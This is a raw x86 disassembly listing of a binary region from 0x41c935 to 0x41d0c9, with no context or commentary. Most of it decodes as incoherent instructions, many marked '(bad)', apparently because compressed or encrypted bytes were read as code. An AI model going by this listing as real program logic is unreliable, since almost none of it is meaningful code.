  41c935:	or     ecx,DWORD PTR [ebp-0x52]
  41c938:	mov    ebp,0xa97026ec
  41c93d:	add    DWORD PTR [ebx+esi*1],eax
  41c940:	mov    edx,0x173b8dc5
  41c945:	test   DWORD PTR [edi],0x9e1f3a39
  41c94b:	adc    DWORD PTR [edx+ebx*8],eax
  41c94e:	les    eax,FWORD PTR [ebp+esi*8-0x46]
  41c952:	and    al,0xdf
  41c954:	mov    bl,0x39
  41c956:	add    bh,BYTE PTR [esi+0x2b3ebd08]
  41c95c:	dec    ecx
  41c95d:	ins    DWORD PTR es:[edi],dx
  41c95e:	(bad)  
  41c95f:	and    BYTE PTR [ebp-0x80],ch
  41c962:	icebp  
  41c963:	sub    BYTE PTR [ebx-0x1b],cl
  41c966:	lods   al,BYTE PTR ds:[esi]
  41c967:	call   0x1459ce89
  41c96c:	xchg   ebp,eax
  41c96d:	inc    esp
  41c96e:	mov    DWORD PTR [edx+ebx*4],eax
  41c971:	xchg   esp,eax
  41c972:	or     eax,0xa3856d29
  41c977:	xor    eax,0xf7e94db
  41c97c:	xchg   edx,eax
  41c97d:	xor    edi,DWORD PTR [ebp+0x62]
  41c980:	dec    eax
  41c981:	daa    
  41c982:	out    0xc5,eax
  41c984:	adc    eax,0x69689f
  41c989:	shr    BYTE PTR [esp+ebp*2+0x17a8f1f9],1
  41c990:	in     al,dx
  41c991:	dec    ebx
  41c992:	shr    BYTE PTR [edx+0x5ce38425],0xea
  41c999:	dec    esi
  41c99a:	ja     0x41ca02
  41c99c:	out    dx,eax
  41c99d:	cli    
  41c99e:	sub    al,0x20
  41c9a0:	sbb    DWORD PTR [ebx+0x2a],esi
  41c9a3:	dec    ebp
  41c9a4:	xlat   BYTE PTR ds:[ebx]
  41c9a5:	and    bl,BYTE PTR [edi-0x7fbda94a]
  41c9ab:	mov    dl,0x94
  41c9ad:	jecxz  0x41c932
  41c9af:	mov    ah,0xa3
  41c9b1:	fidiv  WORD PTR [eax-0x3e]
  41c9b4:	ror    BYTE PTR [edi-0x39917fcf],0x45
  41c9bb:	mov    esi,0xc2ef790e
  41c9c0:	pop    es
  41c9c1:	add    al,0xea
  41c9c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9c4:	push   ecx
  41c9c5:	lea    esp,[esi-0x2c]
  41c9c8:	mov    WORD PTR [edx+eax*4],es
  41c9cb:	pop    ds
  41c9cc:	mov    ds:0x9ca24b97,eax
  41c9d1:	pusha  
  41c9d2:	jg     0x41c9df
  41c9d4:	and    DWORD PTR [edx],edi
  41c9d6:	scas   al,BYTE PTR es:[edi]
  41c9d7:	sub    DWORD PTR [esi],0xbd86f2c2
  41c9dd:	and    edi,DWORD PTR [edi+0x51]
  41c9e0:	imul   ebp,DWORD PTR [esi+0x2c671ac4],0x30
  41c9e7:	push   edx
  41c9e8:	add    bh,dh
  41c9ea:	lods   al,BYTE PTR ds:[esi]
  41c9eb:	sub    al,0x3c
  41c9ed:	(bad)  
  41c9ee:	push   cs
  41c9ef:	xor    DWORD PTR [esi],esi
  41c9f1:	adc    eax,0xd7ecb293
  41c9f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9f8:	popf   
  41c9f9:	cmc    
  41c9fa:	test   al,0xf2
  41c9fc:	mov    gs,WORD PTR [eax]
  41c9fe:	push   eax
  41c9ff:	bound  edx,QWORD PTR es:[esi+0x32]
  41ca03:	push   cs
  41ca04:	jbe    0x41c9b3
  41ca06:	int    0xa6
  41ca08:	sbb    dh,BYTE PTR [edx]
  41ca0a:	jge    0x41c9e1
  41ca0c:	sub    DWORD PTR [edx+eax*8-0x7449fba1],esp
  41ca13:	dec    eax
  41ca14:	mov    ebp,0xbe9003a0
  41ca19:	sbb    DWORD PTR [eax-0x19a61749],esi
  41ca1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca20:	(bad)  
  41ca21:	outs   dx,BYTE PTR ds:[esi]
  41ca22:	push   ecx
  41ca23:	fistp  DWORD PTR [edi-0x558dd7bf]
  41ca29:	adc    DWORD PTR [eax],edi
  41ca2b:	xlat   BYTE PTR ds:[ebx]
  41ca2c:	jmp    0xfb41f0ae
  41ca31:	sub    dl,BYTE PTR ds:0x5df6e8f0
  41ca37:	push   0xdbd482
  41ca3c:	jmp    0x3a52dc70
  41ca41:	mov    ds:0x39a656d8,eax
  41ca46:	mov    bh,0x23
  41ca48:	add    cl,BYTE PTR [esi+0x3343a545]
  41ca4e:	ffreep st(0)
  41ca50:	arpl   WORD PTR [eax+0x27a7d35e],bx
  41ca56:	inc    esi
  41ca57:	inc    ebp
  41ca58:	pusha  
  41ca59:	push   0xffffffff
  41ca5b:	daa    
  41ca5c:	rol    BYTE PTR [ecx+0x7b],0xb1
  41ca60:	rcl    DWORD PTR [eax],0x29
  41ca63:	push   edi
  41ca64:	xchg   ebx,eax
  41ca65:	adc    BYTE PTR [esi-0x1],ah
  41ca68:	fwait
  41ca69:	add    edx,DWORD PTR [edx]
  41ca6b:	pop    ss
  41ca6c:	nop
  41ca6d:	idiv   DWORD PTR [eax+0x1f975b06]
  41ca73:	(bad)  
  41ca74:	sub    esi,DWORD PTR [ebx+0x4ae60bbb]
  41ca7a:	aam    0xfd
  41ca7c:	lods   eax,DWORD PTR ds:[esi]
  41ca7d:	sar    BYTE PTR [ecx+ebp*8],1
  41ca80:	cmp    al,0x7d
  41ca82:	arpl   WORD PTR [eax+0x129acb77],ax
  41ca88:	lea    ecx,[ebp-0x3f94f87d]
  41ca8e:	lods   al,BYTE PTR ds:[esi]
  41ca8f:	in     eax,dx
  41ca90:	fs aam 0xb6
  41ca93:	cmc    
  41ca94:	and    al,0x71
  41ca96:	jbe    0x41cae4
  41ca98:	fs sbb eax,0x191c4e5b
  41ca9e:	dec    edx
  41ca9f:	jae    0x41ca3c
  41caa1:	xchg   BYTE PTR [edi+ebp*2+0x366fd960],ah
  41caa8:	stos   BYTE PTR es:[edi],al
  41caa9:	retf   
  41caaa:	stc    
  41caab:	jmp    FWORD PTR [ecx-0x102314f]
  41cab1:	or     ebp,DWORD PTR [ebp+0x4]
  41cab4:	push   edi
  41cab5:	jmp    0x41cb24
  41cab7:	xor    BYTE PTR [eax-0x4cc52541],dh
  41cabd:	cmp    al,0x18
  41cabf:	cs icebp 
  41cac1:	int    0x88
  41cac3:	shl    DWORD PTR [esi+ebx*8-0x48c695b7],0xed
  41cacb:	jae    0x41cb32
  41cacd:	jnp    0x41cb3e
  41cacf:	addr16 add al,0x1f
  41cad2:	fdivr  QWORD PTR [edx+0x17c8ca2d]
  41cad8:	jmp    0x41cad5
  41cada:	(bad)  
  41cadb:	mov    eax,0xaf53fbfc
  41cae0:	jno    0x41ca6e
  41cae2:	mov    edx,0x4a1d4a5b
  41cae7:	js     0x41ca81
  41cae9:	test   BYTE PTR [esp+eax*4-0x51],0xe2
  41caee:	mov    cl,BYTE PTR [esi+0x3d]
  41caf1:	stc    
  41caf2:	das    
  41caf3:	push   esi
  41caf4:	and    DWORD PTR cs:0xe7e35180,ecx
  41cafb:	cmp    BYTE PTR cs:[edi],ah
  41cafe:	cdq    
  41caff:	xchg   BYTE PTR [eax],dl
  41cb01:	clc    
  41cb02:	add    dl,BYTE PTR [edi]
  41cb04:	jb     0x41cb4a
  41cb06:	xchg   BYTE PTR [eax],dl
  41cb08:	jp     0x41ca91
  41cb0a:	and    BYTE PTR [ebp+0x71],cl
  41cb0d:	stos   DWORD PTR es:[edi],eax
  41cb0e:	in     eax,0x45
  41cb10:	cmp    al,0xf0
  41cb12:	jne    0x41cb90
  41cb14:	pop    edi
  41cb15:	sub    eax,DWORD PTR [ebp+0x6c]
  41cb18:	mov    ds:0xd45fa7dd,al
  41cb1d:	push   0xffffffbb
  41cb1f:	lods   al,BYTE PTR ds:[esi]
  41cb20:	fisttp DWORD PTR [ebx]
  41cb22:	mov    bl,0xb3
  41cb24:	arpl   cx,di
  41cb26:	(bad)  
  41cb27:	mov    esp,0xe6d0b378
  41cb2c:	in     eax,0x5f
  41cb2e:	xchg   DWORD PTR [esi+0x327894d],edx
  41cb34:	test   eax,0xeac78afd
  41cb39:	pop    edi
  41cb3a:	outs   dx,DWORD PTR ds:[esi]
  41cb3b:	lods   al,BYTE PTR ds:[esi]
  41cb3c:	lock stos DWORD PTR es:[edi],eax
  41cb3e:	lahf   
  41cb3f:	and    DWORD PTR [esi],0x3161792d
  41cb45:	fs cmc 
  41cb47:	fistp  WORD PTR [ecx+0x74753bde]
  41cb4d:	adc    al,0x7c
  41cb4f:	cmp    edx,DWORD PTR [edi]
  41cb51:	xor    eax,0xb1db2434
  41cb56:	cmp    al,0x0
  41cb58:	or     DWORD PTR [edx+0x6edcbea4],0x1a
  41cb5f:	imul   esp,DWORD PTR [edi+edi*2-0x79],0xc7429775
  41cb67:	jmp    0x317f:0x88c05010
  41cb6e:	aam    0x45
  41cb70:	aad    0xef
  41cb72:	add    cl,BYTE PTR es:[edi+0x2b]
  41cb76:	ins    DWORD PTR es:[edi],dx
  41cb77:	mov    DWORD PTR [edx-0x617b86c5],esp
  41cb7d:	dec    edi
  41cb7e:	fwait
  41cb7f:	scas   eax,DWORD PTR es:[edi]
  41cb80:	ss mov ah,0x77
  41cb83:	shl    BYTE PTR [ecx+0x16],0x7c
  41cb87:	jb     0x41cbe9
  41cb89:	xor    ch,BYTE PTR [ecx+ebx*2+0x1332ab74]
  41cb90:	and    edx,DWORD PTR [ebp+0x78ae4f25]
  41cb96:	retf   
  41cb97:	rol    DWORD PTR [edx+0x72],1
  41cb9a:	bound  edi,QWORD PTR [ecx+0x1e]
  41cb9d:	and    eax,0xe3849038
  41cba2:	adc    DWORD PTR [ebp+0x6916adb3],edx
  41cba8:	mov    dl,0x3b
  41cbaa:	adc    eax,0x13b9baac
  41cbaf:	and    eax,0xafce192a
  41cbb4:	xchg   edx,eax
  41cbb5:	jb     0x41cbbe
  41cbb7:	xor    ebp,DWORD PTR [esi+0x2]
  41cbba:	nop
  41cbbb:	rol    DWORD PTR [ebx+ebx*4+0x29b1fcfa],1
  41cbc2:	(bad)  
  41cbc3:	js     0x41cb55
  41cbc5:	mov    bx,0xd4cc
  41cbc9:	scas   al,BYTE PTR es:[edi]
  41cbca:	ud2    
  41cbcc:	(bad)  
  41cbcd:	jmp    0x41cb71
  41cbcf:	push   ebp
  41cbd0:	push   edi
  41cbd1:	push   eax
  41cbd2:	add    edx,ecx
  41cbd4:	imul   edx,edi
  41cbd7:	sub    ebx,DWORD PTR ds:0x42a2e1
  41cbdd:	mov    edi,DWORD PTR [ebp-0x8]
  41cbe0:	mov    ebx,DWORD PTR [ebp-0x10]
  41cbe3:	or     DWORD PTR ds:0x42a3e1,0x42a365
  41cbed:	sub    ebx,edi
  41cbef:	mov    DWORD PTR ds:0x42a319,0xb6b
  41cbf9:	jmp    0x41d10b
  41cbfe:	aas    
  41cbff:	int3   
  41cc00:	ret    0xd1d7
  41cc03:	aad    0xd9
  41cc05:	aam    0x8c
  41cc07:	stc    
  41cc08:	stos   BYTE PTR es:[edi],al
  41cc09:	push   0x6c
  41cc0b:	add    eax,0xa0942cd1
  41cc10:	jg     0x41cc8a
  41cc12:	jae    0x41cc90
  41cc14:	js     0x41cc8e
  41cc16:	sbb    al,cl
  41cc18:	dec    ecx
  41cc19:	and    bh,BYTE PTR gs:[edi+0x309ecb1]
  41cc20:	sbb    ecx,0xffffff90
  41cc23:	or     DWORD PTR [ebp+0x4e1f946c],esp
  41cc29:	out    dx,eax
  41cc2a:	in     al,dx
  41cc2b:	push   ecx
  41cc2c:	mov    ebp,0x86365efd
  41cc31:	adc    BYTE PTR [esi],0x56
  41cc34:	or     eax,edx
  41cc36:	mov    bl,0x42
  41cc38:	mov    esp,0x1433423a
  41cc3d:	and    ebx,0xe7c7a3c2
  41cc43:	out    0xc8,eax
  41cc45:	mov    al,ds:0xc0b3d2ab
  41cc4a:	add    BYTE PTR [ebx+0x3c],ah
  41cc4d:	and    eax,0x21e82c68
  41cc52:	xor    bl,BYTE PTR [edx+0x60]
  41cc55:	xor    eax,0xf3ae1ef5
  41cc5a:	sub    eax,0xb8a7af1f
  41cc5f:	aad    0xbd
  41cc61:	sbb    eax,0x1b5422d1
  41cc66:	lahf   
  41cc67:	ss jle 0x41cc9d
  41cc6a:	cmp    edi,DWORD PTR [ebp-0x4a90f08a]
  41cc70:	cdq    
  41cc71:	jae    0x41cc18
  41cc73:	jae    0x41cc96
  41cc75:	dec    esi
  41cc76:	pop    ds
  41cc77:	pop    edx
  41cc78:	inc    esp
  41cc79:	mov    edi,0xd2b43169
  41cc7e:	data16 js 0x41cc01
  41cc81:	add    eax,0x6832f5a8
  41cc86:	jle    0x41ccd0
  41cc88:	cs (bad) 
  41cc8a:	mov    eax,ds:0xb35ab233
  41cc8f:	or     DWORD PTR [esi],ebp
  41cc91:	jbe    0x41cca1
  41cc93:	jecxz  0x41cc3c
  41cc95:	and    DWORD PTR [eax],ecx
  41cc97:	ds ja  0x41ccf1
  41cc9a:	fdivr  QWORD PTR [eax+0x7f]
  41cc9d:	pop    ss
  41cc9e:	outs   dx,BYTE PTR ds:[esi]
  41cc9f:	mov    dl,0x50
  41cca1:	inc    esp
  41cca2:	out    0x30,al
  41cca4:	mov    edi,esi
  41cca6:	rol    DWORD PTR [eax-0x64128a1d],1
  41ccac:	push   ebp
  41ccad:	pop    ebx
  41ccae:	jp     0x41cc73
  41ccb0:	mov    ebp,0x2bbd0e31
  41ccb5:	(bad)  [ebp+0xa]
  41ccb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccba:	push   esp
  41ccbb:	push   0x59
  41ccbd:	add    al,0x65
  41ccbf:	sbb    al,0x67
  41ccc1:	xchg   ebp,eax
  41ccc2:	cdq    
  41ccc3:	test   DWORD PTR [ebp-0x58],ebp
  41ccc6:	xor    al,0xe5
  41ccc8:	(bad)  [edx+ecx*2+0x242fdf61]
  41cccf:	and    ah,BYTE PTR [edi-0x72]
  41ccd2:	mov    ds:0xfb44c621,eax
  41ccd7:	scas   al,BYTE PTR es:[edi]
  41ccd8:	push   ebp
  41ccd9:	(bad)  
  41ccda:	call   FWORD PTR [edi]
  41ccdc:	leave  
  41ccdd:	inc    esi
  41ccde:	and    dh,BYTE PTR [edi-0x75]
  41cce1:	iret   
  41cce2:	ror    dh,cl
  41cce4:	leave  
  41cce5:	gs cmc 
  41cce7:	jge    0x41cd66
  41cce9:	push   ebx
  41ccea:	or     cl,BYTE PTR [edx+0x742afdc8]
  41ccf0:	aas    
  41ccf1:	push   ss
  41ccf2:	scas   al,BYTE PTR es:[edi]
  41ccf3:	je     0x41cca9
  41ccf5:	clc    
  41ccf6:	mov    esi,0x3ca69c07
  41ccfb:	loopne 0x41cd25
  41ccfd:	mov    eax,0xde8ee708
  41cd02:	test   BYTE PTR [edi-0x3c],al
  41cd05:	mov    ebp,0xad631dd1
  41cd0a:	pop    edi
  41cd0b:	fimul  WORD PTR [esi+0x40426f61]
  41cd11:	xor    eax,0x1c21c5c9
  41cd16:	mov    edx,0x10b9d9c8
  41cd1b:	jmp    0x738f:0x6b4c07a3
  41cd22:	fldln2 
  41cd24:	sub    eax,0xc2c8f7ce
  41cd29:	mov    eax,0x64bc995a
  41cd2e:	cwde   
  41cd2f:	mov    bh,0xe2
  41cd31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd32:	mov    eax,0x9c0d6f8d
  41cd37:	mov    WORD PTR [esi-0x4063d44d],ds
  41cd3d:	pop    esp
  41cd3e:	push   es
  41cd3f:	rcl    BYTE PTR gs:[esi-0x898557d],1
  41cd46:	mov    ecx,0x8c98069
  41cd4b:	mov    esp,0x59b28460
  41cd50:	test   BYTE PTR [edi+0x2e],bl
  41cd53:	dec    esi
  41cd54:	mov    bl,BYTE PTR [esi+0x16775d7c]
  41cd5a:	(bad)  
  41cd5c:	mov    ecx,0xedfe45b0
  41cd61:	dec    ebp
  41cd62:	sub    al,0xc2
  41cd64:	mov    ss,WORD PTR ds:0xb4e4ef09
  41cd6a:	push   ds
  41cd6b:	push   esp
  41cd6c:	jae    0x41cdb2
  41cd6e:	or     BYTE PTR [eax-0x57],dl
  41cd71:	in     eax,0xfe
  41cd73:	xchg   esi,eax
  41cd74:	repnz stos DWORD PTR es:[edi],eax
  41cd76:	not    BYTE PTR [edi-0x57]
  41cd79:	(bad)  
  41cd7a:	mov    dl,0xb1
  41cd7c:	dec    ecx
  41cd7d:	test   edx,esi
  41cd7f:	rcl    ebp,cl
  41cd81:	stos   DWORD PTR es:[edi],eax
  41cd82:	sbb    BYTE PTR [esi-0x2a85a5f8],dl
  41cd88:	shr    ebp,1
  41cd8a:	xchg   ebp,eax
  41cd8b:	leave  
  41cd8c:	in     eax,dx
  41cd8d:	push   ebx
  41cd8e:	dec    esp
  41cd8f:	imul   ecx,DWORD PTR [esp+edi*4-0x4debc24d],0xffffff9a
  41cd97:	retf   
  41cd98:	mov    bl,BYTE PTR [edx]
  41cd9a:	lods   al,BYTE PTR ds:[esi]
  41cd9b:	les    ebp,FWORD PTR [esi+0x4c7ac816]
  41cda1:	mul    ecx
  41cda3:	clc    
  41cda4:	add    ebx,DWORD PTR [edx]
  41cda6:	pop    ss
  41cda7:	xchg   esi,eax
  41cda8:	jmp    0x41cd57
  41cdaa:	test   al,0xbd
  41cdac:	addr16 pop ss
  41cdae:	push   es
  41cdaf:	xor    ebx,esp
  41cdb1:	xchg   DWORD PTR [eax],ebp
  41cdb3:	mov    eax,0x1ca1df38
  41cdb8:	ficom  DWORD PTR [ebx+0x2608e464]
  41cdbe:	adc    dh,ch
  41cdc0:	shr    DWORD PTR [edi-0x707cc628],cl
  41cdc6:	jno    0x41cda8
  41cdc8:	add    al,0x86
  41cdca:	pop    ds
  41cdcb:	xor    al,0x71
  41cdcd:	mov    ebp,0xd774126c
  41cdd2:	test   DWORD PTR [ebx+eiz*4+0x7626bf1e],ebp
  41cdd9:	sbb    al,0x8b
  41cddb:	and    eax,0xc23e8152
  41cde0:	mov    eax,0x4348a0d5
  41cde5:	jno    0x41ce1a
  41cde7:	data16 aaa 
  41cde9:	(bad)  
  41cdea:	into   
  41cdeb:	xchg   ebp,eax
  41cdec:	nop
  41cded:	lea    edx,[ecx-0x45]
  41cdf0:	and    esp,DWORD PTR fs:[edi+0x58]
  41cdf4:	xchg   esi,eax
  41cdf5:	xor    eax,0x4fec7933
  41cdfa:	pop    ebp
  41cdfb:	in     al,dx
  41cdfc:	xor    al,0x2c
  41cdfe:	rol    ah,cl
  41ce00:	mov    dl,0xae
  41ce02:	shl    ebx,cl
  41ce04:	or     BYTE PTR [ecx+0x2618d4ac],bl
  41ce0a:	mov    esi,0x10f7e0cc
  41ce0f:	adc    eax,0x85e72589
  41ce14:	int    0x7
  41ce16:	mov    ebp,0xdae8c022
  41ce1b:	mov    eax,ds:0x1dd491d8
  41ce20:	mov    esp,0x1c9c66c6
  41ce25:	pop    ds
  41ce26:	jg     0x41cde5
  41ce28:	sub    DWORD PTR [edx+0x44b08b44],0xfffffff0
  41ce2f:	call   0x880f:0xf1fb178b
  41ce36:	cmp    ah,BYTE PTR [esi+0x765a12e4]
  41ce3c:	sbb    cl,BYTE PTR [edi]
  41ce3e:	idiv   DWORD PTR [esi-0x434eb5c1]
  41ce44:	sar    DWORD PTR [ebp+0x613f00e2],0xf9
  41ce4b:	pop    ebx
  41ce4c:	shl    ecx,1
  41ce4e:	shl    BYTE PTR [ebp+0x45bd3eb5],cl
  41ce54:	sub    al,0x9
  41ce56:	sbb    ecx,DWORD PTR [edx-0x80]
  41ce59:	mov    BYTE PTR [edx-0x38820969],cl
  41ce5f:	sar    ah,1
  41ce61:	lods   eax,DWORD PTR ds:[esi]
  41ce62:	mov    BYTE PTR [esi+ebx*2-0x1b],ch
  41ce66:	adc    DWORD PTR [eax+0x22ce8e2e],ebp
  41ce6c:	xor    al,0x72
  41ce6e:	aaa    
  41ce6f:	mov    al,ds:0xa2b895cc
  41ce74:	stos   BYTE PTR es:[edi],al
  41ce75:	push   edi
  41ce76:	mov    al,BYTE PTR [ecx]
  41ce78:	repz jecxz 0x41ce22
  41ce7b:	jl     0x41ce7f
  41ce7d:	or     DWORD PTR [edi+0x32824711],eax
  41ce83:	jmp    DWORD PTR [edi-0x5a]
  41ce86:	in     eax,dx
  41ce87:	push   ds
  41ce88:	stc    
  41ce89:	jno    0x41ce56
  41ce8b:	mov    ecx,0xcd5730a7
  41ce90:	push   es
  41ce91:	add    bh,dh
  41ce93:	mov    ecx,0xea8ed626
  41ce98:	pop    edx
  41ce99:	mov    edx,0xba05a772
  41ce9e:	test   DWORD PTR [esi-0x3],esi
  41cea1:	push   ebp
  41cea2:	cld    
  41cea3:	xor    al,ah
  41cea5:	repz mov esi,0x81e2fc55
  41ceab:	xor    ch,ah
  41cead:	iret   
  41ceae:	jmp    0x2733:0x1b92adea
  41ceb5:	(bad)  
  41ceb6:	nop
  41ceb7:	inc    ebp
  41ceb8:	mov    cl,0x13
  41ceba:	test   BYTE PTR [esi],bh
  41cebc:	jle    0x41cec0
  41cebe:	push   esp
  41cebf:	inc    edx
  41cec0:	ins    BYTE PTR es:[edi],dx
  41cec1:	fs mov ch,bl
  41cec4:	pop    ecx
  41cec5:	push   ds
  41cec6:	push   edi
  41cec7:	fdivrp st(7),st
  41cec9:	dec    ebp
  41ceca:	mov    dl,0x30
  41cecc:	sbb    DWORD PTR [edx],0xffffff92
  41cecf:	push   ecx
  41ced0:	jmp    0x467f:0xe725ccd8
  41ced7:	push   edx
  41ced8:	cwde   
  41ced9:	jg     0x41ceb0
  41cedb:	sub    BYTE PTR [edx+0x23ba2931],0xb2
  41cee2:	dec    esp
  41cee3:	(bad)  
  41cee4:	jnp    0x41ce7a
  41cee6:	push   es
  41cee7:	pop    ds
  41cee8:	int    0xe8
  41ceea:	(bad)  
  41ceeb:	xor    ch,BYTE PTR [ebp+0x54b299da]
  41cef1:	sbb    BYTE PTR [ecx],ah
  41cef3:	mov    ebp,0x6fafa2af
  41cef8:	jne    0xed4de08d
  41cefe:	ss lock iret 
  41cf01:	mov    eax,0x1fbf6ca3
  41cf06:	or     BYTE PTR [edi-0x21],ch
  41cf09:	xor    BYTE PTR [edx-0x6da1c500],dh
  41cf0f:	inc    ebx
  41cf10:	cmc    
  41cf11:	(bad)
  41cf14:	mov    ah,0x4c
  41cf16:	out    dx,eax
  41cf17:	not    BYTE PTR [edi-0x528c1b67]
  41cf1d:	scas   eax,DWORD PTR es:[edi]
  41cf1e:	cmp    DWORD PTR [edx+eiz*4+0x59513203],edx
  41cf25:	outs   dx,BYTE PTR ds:[esi]
  41cf26:	repz sbb BYTE PTR [edx-0x55d9e08f],0x2d
  41cf2e:	stos   DWORD PTR es:[edi],eax
  41cf2f:	xlat   BYTE PTR ds:[ebx]
  41cf30:	mov    ebp,0x113c6225
  41cf35:	scas   eax,DWORD PTR es:[edi]
  41cf36:	cwde   
  41cf37:	adc    al,bh
  41cf39:	cmp    al,ah
  41cf3b:	stc    
  41cf3c:	shr    BYTE PTR [eax-0x7b],cl
  41cf3f:	dec    edi
  41cf40:	mov    edx,0xa4ee29e3
  41cf45:	xor    edi,DWORD PTR [ebp+0x1]
  41cf48:	pusha  
  41cf49:	push   cs
  41cf4a:	or     ecx,DWORD PTR [ebp+edx*4+0x20]
  41cf4e:	repz jg 0x41cf73
  41cf51:	retf   0x13f
  41cf54:	or     DWORD PTR [edi+0x181c44a4],esp
  41cf5a:	repnz das 
  41cf5c:	mov    esi,0x7cc9e60f
  41cf61:	cmc    
  41cf62:	test   eax,0xabfccd14
  41cf67:	jb     0x41cf97
  41cf69:	rcr    BYTE PTR [ebx+0x7ca90a75],cl
  41cf6f:	data16 adc ah,BYTE PTR [esi]
  41cf72:	jb     0x41cff0
  41cf74:	je     0x41cf38
  41cf76:	jbe    0x41cf26
  41cf78:	and    cl,dl
  41cf7a:	cld    
  41cf7b:	jmp    0x3e4:0xef3b3a9e
  41cf82:	stos   BYTE PTR es:[edi],al
  41cf83:	push   cs
  41cf84:	xor    ecx,DWORD PTR [ebp+0x4de3760d]
  41cf8a:	repnz cli 
  41cf8c:	lds    esi,FWORD PTR [eax]
  41cf8e:	inc    ebp
  41cf8f:	dec    edi
  41cf90:	cld    
  41cf91:	scas   al,BYTE PTR es:[edi]
  41cf92:	sub    DWORD PTR [ebx+0x30],esp
  41cf95:	(bad)  
  41cf97:	stos   DWORD PTR es:[edi],eax
  41cf98:	push   ss
  41cf99:	jne    0x41cfcd
  41cf9b:	icebp  
  41cf9c:	sbb    al,0xfe
  41cf9e:	xchg   ebp,eax
  41cf9f:	stc    
  41cfa0:	dec    esi
  41cfa1:	add    BYTE PTR [ebp+0x3d],al
  41cfa4:	or     DWORD PTR [ecx],ebp
  41cfa6:	mov    ds:0xfb36847e,eax
  41cfab:	push   ss
  41cfac:	adc    BYTE PTR [edi],dl
  41cfae:	retf   
  41cfaf:	icebp  
  41cfb0:	mov    ch,0x66
  41cfb2:	ret    0x4e3c
  41cfb5:	leave  
  41cfb6:	mov    ds:0x76ae17d6,eax
  41cfbb:	sbb    ch,BYTE PTR [ebp+eiz*8-0x48]
  41cfbf:	mov    al,0x63
  41cfc2:	mov    esi,0x26a76be6
  41cfc7:	mov    ah,0xc0
  41cfc9:	and    BYTE PTR [edi-0x5e],0xe8
  41cfcd:	mov    dl,0xa9
  41cfcf:	aam    0x29
  41cfd1:	inc    esp
  41cfd2:	repz cmp BYTE PTR [edi],al
  41cfd5:	out    dx,eax
  41cfd6:	mov    ecx,es
  41cfd8:	(bad)  
  41cfd9:	test   BYTE PTR [edx],0xf4
  41cfdc:	jle    0x41cf6e
  41cfde:	in     al,0x44
  41cfe0:	add    eax,0x7e54db41
  41cfe5:	push   0xfffffff1
  41cfe7:	in     eax,0x69
  41cfe9:	(bad)  
  41cfea:	scas   al,BYTE PTR es:[edi]
  41cfeb:	adc    al,0xc3
  41cfed:	jne    0x41cfb6
  41cfef:	ror    BYTE PTR [ecx+esi*1],0x5c
  41cff3:	jle    0x41cfed
  41cff5:	das    
  41cff6:	mov    ds,WORD PTR [ebp-0x48]
  41cff9:	outs   dx,BYTE PTR ds:[esi]
  41cffa:	in     al,0xce
  41cffc:	mov    ebx,0x9d6cd3ad
  41d001:	jecxz  0x41cfba
  41d003:	xchg   ebx,ecx
  41d005:	(bad)  
  41d006:	xor    edi,DWORD PTR [eax]
  41d008:	cs inc eax
  41d00a:	cld    
  41d00b:	sbb    BYTE PTR [ecx+0x6b6bf6b8],bl
  41d011:	adc    al,0xd9
  41d013:	lods   eax,DWORD PTR ds:[esi]
  41d014:	xchg   ebx,eax
  41d015:	daa    
  41d016:	push   ebp
  41d017:	pop    es
  41d018:	jle    0x41d004
  41d01a:	jp     0x41d053
  41d01c:	icebp  
  41d01d:	pop    edx
  41d01e:	inc    eax
  41d01f:	int3   
  41d020:	(bad)  
  41d022:	fdiv   st,st(1)
  41d024:	adc    al,0x3
  41d026:	xor    eax,ebp
  41d028:	std    
  41d029:	push   eax
  41d02a:	repz ds adc eax,0x47996869
  41d031:	push   eax
  41d032:	xchg   ebp,eax
  41d033:	or     eax,0xef35ac48
  41d038:	pop    ss
  41d039:	inc    esi
  41d03a:	jle    0x41cfec
  41d03c:	test   al,0xa9
  41d03e:	fsub   DWORD PTR [edi-0x498e40ae]
  41d044:	mov    dh,0xab
  41d046:	add    ebp,DWORD PTR [esi+edi*8-0x2c2b765]
  41d04d:	stos   DWORD PTR es:[edi],eax
  41d04e:	sbb    ebx,DWORD PTR [eax]
  41d050:	inc    ebp
  41d051:	in     al,dx
  41d052:	jno    0x41d0bf
  41d054:	lea    edi,[edx+0x3627cd0b]
  41d05a:	inc    ecx
  41d05b:	cmp    eax,0x3712c9db
  41d060:	and    BYTE PTR [edi-0x66dde28e],0x4d
  41d067:	js     0x41d055
  41d069:	sbb    BYTE PTR [eax+0x4a],cl
  41d06c:	mov    gs:0x52deed41,al
  41d072:	(bad)  
  41d073:	jp     0x41d0c5
  41d075:	xor    ecx,DWORD PTR [ecx]
  41d077:	(bad)  
  41d079:	or     DWORD PTR cs:[di+0x37],ebp
  41d07e:	push   edx
  41d07f:	adc    BYTE PTR [edx],cl
  41d081:	push   0xffffffd1
  41d083:	loopne 0x41d061
  41d085:	dec    edi
  41d086:	adc    bl,BYTE PTR [ebp+0x70]
  41d089:	mov    al,0xbc
  41d08b:	inc    eax
  41d08c:	mov    ebp,fs
  41d08e:	and    eax,0xde9334b3
  41d094:	(bad)  
  41d095:	out    0x2b,eax
  41d097:	ins    BYTE PTR es:[edi],dx
  41d098:	pusha  
  41d099:	scas   eax,DWORD PTR es:[edi]
  41d09a:	lock sub al,0x5c
  41d09d:	sbb    DWORD PTR [ecx],0x14694792
  41d0a3:	cmp    eax,DWORD PTR [edx]
  41d0a5:	and    edx,0x7c6ce477
  41d0ab:	add    esp,DWORD PTR [ebp-0x3c]
  41d0ae:	mov    fs,WORD PTR [edi]
  41d0b0:	pop    ebp
  41d0b1:	cmp    al,0x5a
  41d0b3:	mov    ds:0x76631f0e,al
  41d0b8:	dec    edx
  41d0b9:	dec    esp
  41d0ba:	dec    esi
  41d0bb:	das    
  41d0bc:	in     eax,0x46
  41d0be:	into   
  41d0bf:	inc    ecx
  41d0c0:	aam    0xd8
  41d0c2:	scas   al,BYTE PTR es:[edi]
  41d0c3:	mov    ah,0xd2
  41d0c5:	dec    edx
  41d0c6:	inc    edx
  41d0c8:	push   ebx
  41d0c9:	jmp    0x60e59ae
